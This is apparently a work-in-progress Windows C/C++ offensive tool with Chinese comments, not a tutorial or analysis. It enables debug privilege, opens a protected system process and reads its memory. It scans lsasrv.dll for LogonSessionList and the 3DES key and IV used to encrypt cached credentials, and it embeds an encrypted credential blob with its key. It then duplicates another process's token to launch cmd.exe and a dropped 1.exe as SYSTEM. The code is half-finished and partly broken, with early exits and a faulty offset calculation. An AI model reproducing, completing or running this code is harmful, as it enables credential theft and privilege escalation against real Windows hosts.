#include <Windows.h>
#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <userenv.h>
#pragma comment(lib, "Userenv.lib")
HANDLE GetAccessToken(DWORD pid)
{

	/* Retrieves an access token for a process */
	HANDLE currentProcess = {};
	HANDLE AccessToken = {};
	DWORD LastError;

	if (pid == 0)
	{
		currentProcess = GetCurrentProcess();
	}
	else
	{
		currentProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
		if (!currentProcess)
		{
			LastError = GetLastError();
			wprintf(L"ERROR: OpenProcess(): %d\n", LastError);
			return (HANDLE)NULL;
		}
	}
	if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken))
	{
		LastError = GetLastError();
		wprintf(L"ERROR: OpenProcessToken(): %d\n", LastError);
		return (HANDLE)NULL;
	}
	return AccessToken;
}

DWORD getidFBKillProcessByName(const WCHAR* filename) {
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (lstrcmpW(pEntry.szExeFile, filename) == 0)
		{
			return (DWORD)pEntry.th32ProcessID;
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
	return 0;
}
int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			//if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}
HANDLE GrabLsassHandle(int pid) {
	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	return procHandle;
}// Read memory from LSASS process
SIZE_T ReadFromLsass(HANDLE hLsass, void* addr, void* memOut, int memOutLen) {
	SIZE_T bytesRead = 0;

	memset(memOut, 0, memOutLen);
	ReadProcessMemory(hLsass, addr, memOut, memOutLen, &bytesRead);

	return bytesRead;
}
#include <Windows.h>
#include <iostream>

bool EnableDebugPrivilege()
{
	HANDLE tokenHandle;
	TOKEN_PRIVILEGES tokenPrivileges;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
	{
		std::cout << "Failed to open process token. Error: " << GetLastError() << std::endl;
		return false;
	}

	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
	{
		std::cout << "Failed to lookup privilege value. Error: " << GetLastError() << std::endl;
		CloseHandle(tokenHandle);
		return false;
	}

	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luid;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
	{
		std::cout << "Failed to adjust token privileges. Error: " << GetLastError() << std::endl;
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(tokenHandle);
	return true;
}

int FindKeys(HANDLE hLsass, char* lsasrvMem) {

	//DWORD keySigOffset = 0;
	//DWORD ivOffset = 0;
	//DWORD desOffset = 0, aesOffset = 0;
	//KIWI_BCRYPT_HANDLE_KEY h3DesKey, hAesKey;
	//KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
	//void* keyPointer = NULL;

	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
	// 我们把lsasrv.dll映射到我们当前的进程，避免对远程进程内存进行过多的操作
	unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
	if (lsasrvLocal == (unsigned char*)0) {
		printf("[x] Error: Could not load lsasrv.dll locally\n");
		return 1;
	}
	printf("[*] Loaded lsasrv.dll locally at address %p\n", lsasrvLocal);

	// 在我们映射进来的内存地址空间中搜索字节串
	// Windows10 1709 16299.15
	// 49f7e048c1ea04488d045248c1e0034c2bc0418bf8488d047f48c1e005
	BYTE sig[29] = { 0x49,0xf7,0xe0,0x48,0xc1,0xea,0x04,0x48,0x8d,0x04,0x52,0x48,0xc1,0xe0,0x03,0x4c,0x2b,0xc0,0x41,0x8b,0xf8,0x48,0x8d,0x04,0x7f,0x48,0xc1,0xe0,0x05 };
	unsigned char* sigLocation = 0;
	for (int i = 0; i < 0x2000000000; i++) {
		if (0 == memcmp(lsasrvLocal + i, sig, 29)) {
			printf("sig located: %p", lsasrvLocal + i);
			sigLocation = lsasrvLocal + i; break;
		}
	}
	// +29跳过sig长度，再+27到达lea     rcx,[lsasrv!LogonSessionList (00007ff8`490bb7f0)]   指令的机器码
	// +3跳过lea rcx
	unsigned char* almostthere = sigLocation + 29 + 27 + 3;
	// 后面四个字节翻转过来就是偏移量
	DWORD realoffset = *(DWORD*)almostthere | (*(DWORD*)(almostthere + 1) << 8) | (*(DWORD*)(almostthere + 2) << 16) | (*(DWORD*)(almostthere + 3) << 24);
	// +4就是下一条指令的地址，和上面计算出来的偏移量相加，就是符号地址
	// 不过这个是我们的内存空间，不是lsass进程的内存空间，所以我们要计算出来其相对于lsasrv基地址的相对地址，-base
	//almostthere+4+ realoffset- lsasrvLocal
		// 不对，相对地址应该在计算出来siglocateion之后救济算了，后面的计算应该相对于远程进程进行计算
	// 这个就是远程进程的地址，从这里拷贝内存出来，计算出realoffset
	unsigned char* asd[1234] = { 0 };
	// 拷贝4节就够了，4字节的操作数
	ReadFromLsass(hLsass, (void*)(sigLocation - lsasrvLocal + lsasrvMem + 29 + 27 + 3), (void*)asd, 4);
	realoffset = *(DWORD*)asd | (*(DWORD*)(asd + 1) << 8) | (*(DWORD*)(asd + 2) << 16) | (*(DWORD*)(asd + 3) << 24);
	unsigned char* LogonSessionList = (unsigned char*)(sigLocation - lsasrvLocal + lsasrvMem + 29 + 27 + 3) + 4 + realoffset;
	// 验证成功，测试了一下，确实找到了正确的地址
	printf("LogonSessionList addr: %p\n", LogonSessionList);

	// 下面开始定位 h3deskey和iv，原理和上面是一样的   uf lsasrv!LsaEncryptMemory
	BYTE soig2[42] = { 0xf7,0xd8,0x45,0x1b,0xc9,0x41,0x83,0xe1,0x08,0x41,0x83,0xc1,0x08,0x45,0x85,0xc0,0x74,0x51,0x41,0x83,0xf8,0x01,0x75,0x39,0x44,0x89,0x5c,0x24,0x48,0x48,0x8d,0x44,0x24,0x50,0x48,0x89,0x44,0x24,0x40,0x44,0x8b,0xc2 };
	unsigned char* sigLocation2 = 0;
	for (int i = 0; i < 0x2000000000; i++) {
		if (0 == memcmp(lsasrvLocal + i, soig2, 42)) {
			printf("sig2 located: %p", lsasrvLocal + i);
			sigLocation2 = lsasrvLocal + i; break;
		}
	}
	// 往回减45byte来获取到   mov     r10,qword ptr [lsasrv!h3DesKey (00007ff8`42afb718)]
	// +3跳过mov r10

	unsigned char* asd2[1234] = { 0 };
	// 拷贝4节就够了，4字节的操作数
	ReadFromLsass(hLsass, (void*)(sigLocation2 - 45 + 3 - lsasrvLocal + lsasrvMem), (void*)asd2, 4);
	realoffset = *(DWORD*)asd2 | (*(DWORD*)(asd2 + 1) << 8) | (*(DWORD*)(asd2 + 2) << 16) | (*(DWORD*)(asd2 + 3) << 24);
	unsigned char* _3deskey = (unsigned char*)(sigLocation2 - 45 + 3 - lsasrvLocal + lsasrvMem) + 4 + realoffset;
	printf("_3deskey addr: %p\n", _3deskey);

	// aes key和iv都在一块，他们都出现在同一个汇编文件中

	unsigned char* asd3[1234] = { 0 };
	// 拷贝4节就够了，4字节的操作数   跳过19+3bytes  movups xmm0    到达   movups  xmm0,xmmword ptr [lsasrv!InitializationVector (00007ff8`42afb700)]
	ReadFromLsass(hLsass, (void*)(sigLocation2 - 45 + 19 + 3 - lsasrvLocal + lsasrvMem), (void*)asd3, 4);
	realoffset = *(DWORD*)asd3 | (*(DWORD*)(asd3 + 1) << 8) | (*(DWORD*)(asd3 + 2) << 16) | (*(DWORD*)(asd3 + 3) << 24);
	unsigned char* _iv = (unsigned char*)(sigLocation2 - 45 + 19 + 3 - lsasrvLocal + lsasrvMem) + 4 + realoffset;
	printf("_iv value addr: %p\n", _iv);


	exit(-1);

	// Search for AES/3Des/IV signature within lsasrv.dll and grab the offset


	return 0;
}
#include <windows.h>
#include <iostream>
#include <comdef.h>
#include <Wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

int main(int argc, char** argv)
{
	DWORD _event_svchost_pid;

		HRESULT hres;

		// Initialize COM library
		hres = CoInitializeEx(0, COINIT_MULTITHREADED);
		if (FAILED(hres)) {
			std::cerr << "Failed to initialize COM library. Error code: " << hres << std::endl;
			return 1;
		}

		// Initialize COM security
		hres = CoInitializeSecurity(
			NULL,
			-1,
			NULL,
			NULL,
			RPC_C_AUTHN_LEVEL_DEFAULT,
			RPC_C_IMP_LEVEL_IMPERSONATE,
			NULL,
			EOAC_NONE,
			NULL
		);

		if (FAILED(hres)) {
			std::cerr << "Failed to initialize security. Error code: " << hres << std::endl;
			CoUninitialize();
			return 1;
		}

		// Create a WMI locator
		IWbemLocator* pLoc = NULL;
		hres = CoCreateInstance(
			CLSID_WbemLocator,
			0,
			CLSCTX_INPROC_SERVER,
			IID_IWbemLocator,
			(LPVOID*)&pLoc
		);

		if (FAILED(hres)) {
			std::cerr << "Failed to create WMI locator. Error code: " << hres << std::endl;
			CoUninitialize();
			return 1;
		}

		// Connect to the WMI namespace
		IWbemServices* pSvc = NULL;
		hres = pLoc->ConnectServer(
			_bstr_t(L"ROOT\\CIMV2"),
			NULL,
			NULL,
			0,
			NULL,
			0,
			0,
			&pSvc
		);

		if (FAILED(hres)) {
			std::cerr << "Failed to connect to WMI namespace. Error code: " << hres << std::endl;
			pLoc->Release();
			CoUninitialize();
			return 1;
		}

		// Set the security levels on the proxy
		hres = CoSetProxyBlanket(
			pSvc,
			RPC_C_AUTHN_WINNT,
			RPC_C_AUTHZ_NONE,
			NULL,
			RPC_C_AUTHN_LEVEL_CALL,
			RPC_C_IMP_LEVEL_IMPERSONATE,
			NULL,
			EOAC_NONE
		);

		if (FAILED(hres)) {
			std::cerr << "Failed to set proxy blanket. Error code: " << hres << std::endl;
			pSvc->Release();
			pLoc->Release();
			CoUninitialize();
			return 1;
		}

		// Query the Win32_Service class to get information about services
		IEnumWbemClassObject* pEnumerator = NULL;
		hres = pSvc->ExecQuery(
			bstr_t("WQL"),
			bstr_t("SELECT * FROM Win32_Service WHERE Name='EventLog'"),
			WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
			NULL,
			&pEnumerator
		);

		if (FAILED(hres)) {
			std::cerr << "Failed to execute WMI query. Error code: " << hres << std::endl;
			pSvc->Release();
			pLoc->Release();
			CoUninitialize();
			return 1;
		}

		// Iterate over the query results
		IWbemClassObject* pclsObj = NULL;
		ULONG uReturn = 0;

		while (pEnumerator) {
			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

			if (0 == uReturn) {
				break;
			}

			VARIANT vtProp;

			// Get the ProcessId property
			hr = pclsObj->Get(L"ProcessId", 0, &vtProp, 0, 0);

			if (SUCCEEDED(hr)) {
				  _event_svchost_pid = vtProp.uintVal;
				std::cout << "Service Process ID: " << vtProp.uintVal << std::endl;
				VariantClear(&vtProp);
			}

			pclsObj->Release();
		}

		pSvc->Release();
		pLoc->Release();
		pEnumerator->Release();
		CoUninitialize();

		//return 0;
	

	//wprintf(L"中文");
	//exit(-1);
	EnableDebugPrivilege();
	//HANDLE  hLsass = GrabLsassHandle(GetLsassPid());
	HANDLE  hLsass = GrabLsassHandle(_event_svchost_pid);
	
	if (hLsass == INVALID_HANDLE_VALUE) {
		printf("[x] Error: Could not open handle to lsass process\n");
		return 1;
	}
	HMODULE lsassDll[1024];
	DWORD bytesReturned;
	char modName[MAX_PATH];
	char* lsass = NULL, * lsasrv = NULL;

	if (EnumProcessModules(hLsass, lsassDll, sizeof(lsassDll), &bytesReturned)) {

		// For each DLL address, get its name so we can find what we are looking for
		for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
			GetModuleFileNameExA(hLsass, lsassDll[i], modName, sizeof(modName));

			// Find DLL's we want to hunt for signatures within
			//if (strstr(modName, "lsass.exe") != (char*)0) {
			if (strstr(modName, "svchost.exe") != (char*)0) {
				lsass = (char*)lsassDll[i];
			}
			else if (strstr(modName, "lsasrv.dll") != (char*)0) {
				lsasrv = (char*)lsassDll[i];
			}
		}
	}

	printf("[*] lsass.exe found at %p\n", lsass);
	printf("[*] lsasrv.dll found at %p\n", lsasrv);
	exit(-01);
	if (FindKeys(hLsass, lsasrv) != 0) {
		printf("[x] Error: Could not find keys in lsass\n");
		return 1;
	}


	return 0;
	//ULONG DecryptCredentials(char* encrypedPass, DWORD encryptedPassLen, unsigned char* decryptedPass, ULONG decryptedPassLen,char* key) {
	BYTE encrypted[432] = { 0x50, 0x72, 0x69, 0x6d, 0x61, 0x72, 0x79, 0x00, 0x70, 0x67, 0x53, 0xbc, 0xb5, 0x57, 0x9f, 0xf6, 0xef, 0xda, 0x1d, 0xb7, 0x3e, 0xcc, 0x8f, 0xf3, 0x4b, 0xd1, 0xb9, 0x90, 0x4a, 0x01, 0xd3, 0xfa, 0xd2, 0x74, 0x02, 0xe1, 0x91, 0xd6, 0x22, 0x75, 0x19, 0xd3, 0x75, 0x83, 0xd9, 0xd1, 0x2d, 0x85, 0xf3, 0x8e, 0xc2, 0xfd, 0x9d, 0x81, 0x5f, 0xa7, 0xc4, 0xc0, 0xa6, 0xe9, 0x2a, 0x24, 0x39, 0x67, 0x9a, 0x7c, 0x05, 0xc8, 0x14, 0xc8, 0xc3, 0x2a, 0xb2, 0x85, 0x3b, 0xc8, 0x25, 0x0c, 0x1e, 0xed, 0x21, 0x8a, 0x87, 0x9e, 0xab, 0xdf, 0x22, 0xc4, 0x6d, 0x4d, 0xf3, 0x23, 0xdd, 0x25, 0x52, 0xcf, 0xe7, 0xc1, 0xcc, 0x26, 0x47, 0xb3, 0x2a, 0xbe, 0xc4, 0x1d, 0xcc, 0xf2, 0x04, 0x13, 0xb4, 0x80, 0x53, 0xa2, 0xc6, 0xdc, 0xe7, 0x08, 0xcf, 0x43, 0xfa, 0x3a, 0x6d, 0x26, 0xbe, 0x9b, 0xf0, 0x0b, 0x44, 0x3d, 0xad, 0xee, 0xe2, 0x62, 0x90, 0x63, 0x96, 0xf9, 0x87, 0xed, 0x42, 0x4e, 0x84, 0x6a, 0xe5, 0x14, 0xf1, 0xc5, 0x96, 0xca, 0x94, 0x6d, 0xe7, 0x5a, 0x40, 0x0f, 0xc1, 0xc7, 0xdb, 0xa0, 0x7a, 0x66, 0x9b, 0x0c, 0x8c, 0x6b, 0xed, 0xc2, 0x99, 0x6d, 0x5a, 0xdf, 0x60, 0x9c, 0x40, 0x99, 0x62, 0x62, 0x06, 0xc6, 0xb9, 0x66, 0x50, 0xb6, 0x68, 0x22, 0x4f, 0xf5, 0x10, 0x99, 0x6c, 0xda, 0xd2, 0x6e, 0xef, 0xbf, 0xd2, 0x03, 0x6e, 0x95, 0x3e, 0xec, 0xae, 0x5f, 0xa6, 0x00, 0x12, 0xa1, 0x3d, 0xeb, 0x2f, 0xb9, 0x81, 0xcc, 0x65, 0xb9, 0xc0, 0x22, 0x40, 0x33, 0x92, 0x7a, 0x48, 0x5a, 0xc1, 0x3c, 0x83, 0xec, 0xb7, 0x6b, 0xaa, 0x33, 0xfb, 0x53, 0x74, 0xd9, 0x88, 0x9f, 0x27, 0x03, 0x4a, 0x21, 0x03, 0xc9, 0xc5, 0xf5, 0x38, 0x30, 0x4e, 0x35, 0xbf, 0x4b, 0x71, 0xf7, 0xef, 0x16, 0x8d, 0x7b, 0x64, 0xe4, 0xc4, 0xcc, 0x91, 0x8e, 0x36, 0xba, 0x0f, 0x4f, 0xd7, 0xf5, 0x06, 0x23, 0x1f, 0x07, 0x93, 0x76, 0xe6, 0xc3, 0x37, 0x14, 0x6d, 0x16, 0x1b, 0xdd, 0xae, 0xb3, 0x4a, 0x4f, 0xa4, 0x4c, 0xfb, 0xd8, 0x4f, 0xca, 0xc8, 0x59, 0xb0, 0xd2, 0x06, 0x43, 0xf7, 0x20, 0xd4, 0xdf, 0xb2, 0xb6, 0xee, 0x1b, 0xbd, 0x91, 0xce, 0xc1, 0x7e, 0x1f, 0x98, 0x37, 0xe1, 0x7b, 0x40, 0xf8, 0x08, 0x0c, 0x2d, 0xe1, 0x4a, 0xd6, 0xdb, 0x2e, 0x62, 0xc2, 0x76, 0x7a, 0x2b, 0xdf, 0x9a, 0x6d, 0x66, 0x6e, 0x14, 0x19, 0x7e, 0x8f, 0x5b, 0xf7, 0xcb, 0x75, 0xc1, 0x3b, 0x20, 0x57, 0x94, 0x6e, 0xce, 0xa4, 0xf5, 0x5c, 0x63, 0x00, 0x3e, 0x7e, 0x3a, 0xf9, 0xfa, 0x32, 0xc1, 0x1f, 0x19, 0x6b, 0x0a, 0xa0, 0x2c, 0x02, 0xf0, 0xfc, 0x5f, 0x22, 0x48, 0xdd, 0x6e, 0xa8, 0xfd, 0xd9, 0x77, 0x43, 0x32, 0x32, 0x1d, 0x40, 0x46, 0x5c, 0x5d, 0xd9, 0x89, 0x3b, 0xde, 0x6a, 0xf6, 0x68, 0xf7, 0xf1, 0x87, 0x94, 0x7c, 0x7a, 0x41, 0xc3, 0xc2, 0x0c, 0x54, 0xe2, 0x74, 0x07, 0x37, 0x39, 0xca, 0x18, 0xf7, 0xeb, 0x54, 0x5f, 0xcf, 0x5c, 0x1d, 0x68, 0xef, 0x94, 0x8b, 0xe9, 0x51, 0xb1, 0x4c, 0x51 };


	BYTE key[24] = { 0x50, 0xc0, 0x20, 0x6d, 0x0e, 0x4d, 0x13, 0x0d, 0x07, 0x20, 0x23, 0x57, 0x1d, 0xa9, 0xec, 0xad, 0x24, 0xb2, 0x55, 0xe5, 0x12, 0xd5, 0x71, 0x0c };

	//DecryptCredentials((char*)encrypted, 432, NULL, 0, (char*)key);

	return 0;
	DWORD LastError;
	DWORD ppppppppppuid = 0;
	ppppppppppuid = atoi(argv[1]);
	/* Argument Check */
	/*if (argc < 2)
	{
		wprintf(L"Usage: %ls <exePath>\n", argv[0]);
		return 1;
	}*/

	/* Process ID definition */
	DWORD pid;
	pid = getidFBKillProcessByName(L"winlogon.exe");
	if ((pid == NULL) || (pid == 0)) return 1;
	WCHAR* dppath = (WCHAR*)malloc(1234);
	//dppath = argv[1];
	wprintf(L"[+] Pid Chosen: %d\n", pid);

	// Retrieves the remote process token.
	HANDLE pToken = GetAccessToken(ppppppppppuid);

	//These are required to call DuplicateTokenEx.
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;
	if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return 1;
	}
	wprintf(L"Process token has been duplicated.\n");

	/* Starts a new process with SYSTEM token */
	/*STARTUPINFO si = {};
	PROCESS_INFORMATION pi = {};*/
	BOOL ret;

	STARTUPINFO si = { sizeof(si) };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW; // Hide the console window of the new process
	si.lpDesktop = NULL;
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags |= STARTF_USESTDHANDLES;

	/*BOOL CreateEnvironmentBlock(
		[out]          LPVOID * lpEnvironment,
		[in, optional] HANDLE hToken,
		[in]           BOOL   bInherit
	);*/
	VOID* lpEnvironment;
	CreateEnvironmentBlock(&lpEnvironment, pNewToken, FALSE);
	WCHAR dppaasdasdasssssdth[1234] = L"/c chdir C:\\users\\public&&C:\\Users\\public\\1.exe -dir %temp%";
	//WCHAR dppaasdasdasssssdth[1234] = L"/c whoami>C:\\users\\public\\1.txt";


	PROCESS_INFORMATION pi;
	ret = CreateProcessAsUserW(
		pNewToken,             // The security token to use for the new process
		L"C:\\Windows\\System32\\cmd.exe", // The logon option to use
		const_cast<WCHAR*>(dppaasdasdasssssdth), //  // The path to the executable file
		NULL,      // The command line arguments to pass to the executable
		NULL,                  // Additional creation flags
		FALSE,               // Environment block to use for the new process
		CREATE_UNICODE_ENVIRONMENT, // The current working directory for the new process
		lpEnvironment,
		NULL,//L"C:\\useres\\public",
		&si,                // The STARTUPINFO structure to use
		&pi                 // Information about the new process
	);


	//ret = CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, dppath, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!ret)
	{
		DWORD lastError;
		lastError = GetLastError();
		wprintf(L"CreateProcessWithTokenW: %d\n", lastError);
		return 1;
	}
	wprintf(L"Process token has been duplicated.\n");
}
